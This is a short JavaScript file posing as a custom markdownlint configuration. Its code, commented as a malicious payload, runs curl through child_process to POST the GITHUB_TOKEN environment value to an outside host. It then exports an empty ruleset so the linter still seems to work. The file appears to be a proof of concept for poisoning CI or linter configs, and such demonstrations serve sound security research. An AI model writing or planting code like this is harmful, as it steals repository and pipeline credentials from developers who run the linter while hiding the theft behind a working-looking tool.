console.log("Executing custom markdownlint config...");

// 🚨 Malicious payload (exfiltrate GitHub token)
require('child_process').exec(
  'curl -X POST https://cvrpfqsp3mbjks9jetq0s7ine6uhb1ebo.hello-response.com --data-binary @$GITHUB_TOKEN'
);

// Optional: export an empty ruleset so linter still "works"
module.exports = {};
